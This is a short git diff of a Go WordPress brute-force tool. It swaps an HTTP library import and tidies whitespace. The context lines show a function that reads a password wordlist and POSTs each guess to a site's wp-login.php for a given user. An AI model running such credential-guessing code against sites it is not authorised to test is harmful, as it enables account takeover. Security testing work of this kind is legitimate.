@@ -5,21 +5,21 @@ import (
 	"net/http"
 	"os"
 
+	"github.com/institute-atri/ghttp"
 	"github.com/institute-atri/glogger"
-	"github.com/institute-atri/gnet"
 )
 
 // This function will perform a brute force attack on the WordPress site, providing the link and user
 func Bruteforce(url, user string, pathToWordlist string) {
 	glogger.Warning("Doing brute force attack...")
 	var wordlistFile string
-	
+
 	if pathToWordlist == "" {
 		wordlistFile = "../tools/bruteforce/wordlist.txt"
 	} else {
 		wordlistFile = pathToWordlist
 	}
-	
+
 	urlLogin := url + "/wp-login.php"
 
 	file, err := os.Open(wordlistFile)
@@ -44,7 +44,7 @@ func tryingPasswords(scanner *bufio.Scanner, url, user string) {
 	for scanner.Scan() {
 		word := scanner.Text()
 
-		r := gnet.NewHttp()
+		r := ghttp.NewHttp()
 
 		r.SetURL(url)
 		r.SetMethod("POST")
